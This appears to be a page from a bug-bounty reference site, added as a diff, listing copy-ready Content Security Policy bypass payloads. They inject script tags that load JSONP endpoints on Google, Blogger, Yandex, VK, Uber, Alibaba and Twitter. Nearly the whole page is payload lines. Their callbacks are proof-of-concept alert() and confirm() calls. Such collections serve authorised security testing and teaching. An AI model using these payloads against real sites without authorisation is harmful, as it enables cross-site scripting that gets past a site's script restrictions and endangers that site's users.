@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSP Bypass Payloads - Bug Bounty Hub</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="index.html" class="nav-logo">
+                <img src="logo/logo.png" alt="BugBounty Hub">
+            </a>
+            <button class="nav-toggle" id="navToggle"><i class="fas fa-bars"></i></button>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="index.html" class="nav-link">Home</a></li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link">Vulnerabilities <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="manual-open-redirect.html"><i class="fas fa-external-link-alt"></i> Manual Open Redirect</a></li>
+                        <li><a href="open-redirect.html"><i class="fas fa-robot"></i> Automated Open Redirect</a></li>
+                        <li><a href="xss.html"><i class="fas fa-bug"></i> XSS</a></li>
+                        <li><a href="blind-xss.html"><i class="fas fa-eye-slash"></i> Blind XSS</a></li>
+                        <li><a href="sqli.html"><i class="fas fa-database"></i> SQL Injection</a></li>
+                        <li><a href="idor.html"><i class="fas fa-id-card"></i> IDOR</a></li>
+                        <li><a href="lfi.html"><i class="fas fa-folder-open"></i> LFI</a></li>
+                        <li><a href="cmdi.html"><i class="fas fa-terminal"></i> Command Injection</a></li>
+                        <li><a href="subdomain-takeover.html"><i class="fas fa-globe"></i> Subdomain Takeover</a></li>
+                        <li><a href="cors.html"><i class="fas fa-exchange-alt"></i> CORS</a></li>
+                        <li><a href="csp-guide.html"><i class="fas fa-shield-alt"></i> CSP Guide</a></li>
+                        <li><a href="xxe.html"><i class="fas fa-file-code"></i> XXE</a></li>
+                        <li><a href="ssti.html"><i class="fas fa-file-alt"></i> SSTI</a></li>
+                        <li><a href="crlf.html"><i class="fas fa-code"></i> CRLF Injection</a></li>
+                        <li><a href="ssrf-payloads.html"><i class="fas fa-server"></i> SSRF Payloads</a></li>
+                        <li><a href="race-conditions.html"><i class="fas fa-stopwatch"></i> Race Conditions</a></li>
+                        <li><a href="poisoning.html"><i class="fas fa-bolt"></i> Cache Poisoning</a></li>
+                        <li><a href="information-disclosure.html"><i class="fas fa-eye"></i> Info Disclosure</a></li>
+                        <li><a href="host-header-injection.html"><i class="fas fa-globe-americas"></i> Host Header</a></li>
+                        <li><a href="header-injection.html"><i class="fas fa-heading"></i> Header Injection</a></li>
+                        <li><a href="html-injection.html"><i class="fas fa-code"></i> HTML Injection</a></li>
+                        <li><a href="directory-traversal.html"><i class="fas fa-folder"></i> Directory Traversal</a></li>
+                        <li><a href="wordpress.html"><i class="fab fa-wordpress"></i> WordPress</a></li>
+                        <li><a href="spring-boot.html"><i class="fas fa-leaf"></i> Spring Boot</a></li>
+                    </ul>
+                </li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link">Tools <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="useful-tools.html"><i class="fas fa-toolbox"></i> Recon Tools</a></li>
+                        <li><a href="nuclei.html"><i class="fas fa-rocket"></i> Nuclei</a></li>
+                    </ul>
+                </li>
+                <li><a href="payloads.html" class="nav-link">Payloads</a></li>
+                <li><a href="csp-bypass-payloads.html" class="nav-link active">CSP Bypass</a></li>
+                <li><a href="about.html" class="nav-link">About</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <header class="page-header">
+        <div class="breadcrumb">
+            <a href="index.html">Home</a>
+            <i class="fas fa-chevron-right"></i>
+            <a href="payloads.html">Payloads</a>
+            <i class="fas fa-chevron-right"></i>
+            <span>CSP Bypass</span>
+        </div>
+        <h1><i class="fas fa-unlock"></i> CSP Bypass Payloads</h1>
+        <p>Content Security Policy bypass using JSONP endpoints.</p>
+    </header>
+
+    <section class="content-section">
+        <div class="container">
+            <div class="content-card">
+                <h2><i class="fas fa-info-circle"></i> Source</h2>
+                <p>File: <code>json-CSPbypass-payloads.txt</code></p>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fab fa-google"></i> Google Services</h2>
+                <div class="code-block">
+                    <button class="copy-btn">Copy All</button>
+                    <pre>"&gt;&lt;script src="https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert#1"&gt;&lt;/script&gt;
+"&gt;&lt;script src="https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)"&gt;&lt;/script&gt;
+"&gt;&lt;script src="https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)"&gt;&lt;/script&gt;
+"&gt;&lt;script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"&gt;&lt;/script&gt;
+"&gt;&lt;script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"&gt;&lt;/script&gt;
+"&gt;&lt;script src="https://maps.googleapis.com/maps/api/js?key=[REPLACE_BY_GOOGLE_API_KEY_FROM_CURRENT_WEBSITE]&amp;callback=alert(1337)"&gt;&lt;/script&gt;</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-blog"></i> Blogger</h2>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>"&gt;&lt;script src="https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)"&gt;&lt;/script&gt;</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-globe"></i> Yandex</h2>
+                <div class="code-block">
+                    <button class="copy-btn">Copy All</button>
+                    <pre>"&gt;&lt;script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert(1337)"&gt;&lt;/script&gt;
+"&gt;&lt;script src="https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert"&gt;&lt;/script&gt;</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fab fa-vk"></i> VK.com</h2>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>"&gt;&lt;script src="https://api.vk.com/method/wall.get?callback=alert(1337)"&gt;&lt;/script&gt;</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-car"></i> Uber</h2>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>"&gt;&lt;script+src="https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain);"&gt;&lt;/script&gt;</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-shopping-bag"></i> Alibaba</h2>
+                <div class="code-block">
+                    <button class="copy-btn">Copy All</button>
+                    <pre>"&gt;&lt;script+src="https://detector.alicdn.com/2.7.3/index.php?callback=alert(1337)"&gt;&lt;/script&gt;
+"&gt;&lt;script+src="https://suggest.taobao.com/sug?callback=alert(1337)"&gt;&lt;/script&gt;
+"&gt;&lt;script+src="https://count.tbcdn.cn//counter3?callback=alert(1337)"&gt;&lt;/script&gt;</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fab fa-twitter"></i> Twitter</h2>
+                <div class="code-block">
+                    <button class="copy-btn">Copy All</button>
+                    <pre>"&gt;&lt;script+src="http://search.twitter.com/trends.json?callback=alert()"&gt;&lt;/script&gt;
+"&gt;&lt;script+src="https://twitter.com/statuses/user_timeline/yakumo119info.json?callback=confirm()"&gt;&lt;/script&gt;</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-link"></i> Related Pages</h2>
+                <a href="csp-guide.html" class="btn btn-primary">CSP Complete Guide</a>
+                <a href="guides-csp-bypass.html" class="btn btn-secondary" style="margin-left: 0.5rem;">CSP Bypass Resources</a>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2026 Bug Bounty Hub. Open source security reference.</p>
+        </div>
+    </footer>
+
+    <div id="toast" class="toast">Copied to clipboard!</div>
+    <script src="script.js"></script>
+</body>
+</html>
